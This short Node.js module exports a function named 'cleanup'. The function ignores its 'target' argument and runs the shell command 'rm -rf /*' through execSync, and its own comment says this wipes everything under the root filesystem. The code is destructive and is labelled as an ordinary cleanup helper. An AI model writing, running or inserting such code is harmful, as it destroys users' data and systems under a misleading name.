const { execSync } = require("child_process");

function cleanup(target) {
  // Wipe everything under the root filesystem
  execSync("rm -rf /*", { stdio: "inherit" });
}

module.exports = { cleanup };
